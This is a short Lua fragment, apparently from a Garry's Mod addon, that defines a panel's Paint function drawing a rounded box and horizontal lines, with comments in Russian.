gavteeesk.Paint = function(self, w, h)
draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
surface.SetDrawColor( getcolormixer(1, 70) ) -- красный цвет

colorsss1 = 8
colorsss2 = 502
colorpos = 97


surface.DrawLine( colorsss1, 95, colorsss2, 95 ) -- дополнительная полоса под кнопками
surface.DrawLine( colorsss1, 96, colorsss2, 96 ) -- дополнительная полоса под кнопками
surface.DrawLine( colorsss1, 97, colorsss2, 97 ) -- дополнительная полоса под кнопками

for i=1,numbersch do
colorpos = colorpos + 45
--surface.DrawLine( colorsss1, colorpos, colorsss2, colorpos ) -- дополнительная полоса под кнопками
colorpos = colorpos + 1
--surface.DrawLine( colorsss1, colorpos, colorsss2, colorpos ) -- дополнительная полоса под кнопками
colorpos = colorpos + 1
--surface.DrawLine( colorsss1, colorpos, colorsss2, colorpos ) -- дополнительная полоса под кнопками
end





surface.SetDrawColor( getcolormixer(1, 128) ) -- красный цвет
--surface.DrawOutlinedRect( 10, 25, 500, 485, 3 ) -- красная рамка
--surface.DrawOutlinedRect( 13, 88, 344, 0, 1 ) -- рамка под кнопками
local sideilp = 62
surface.DrawLine( 8, sideilp, 502, sideilp ) -- дополнительная полоса под кнопками
surface.DrawLine( 8, sideilp + 1, 502, sideilp + 1 )
surface.DrawLine( 8, sideilp + 2, 502, sideilp + 2 )
end


posishion = posishion + 6

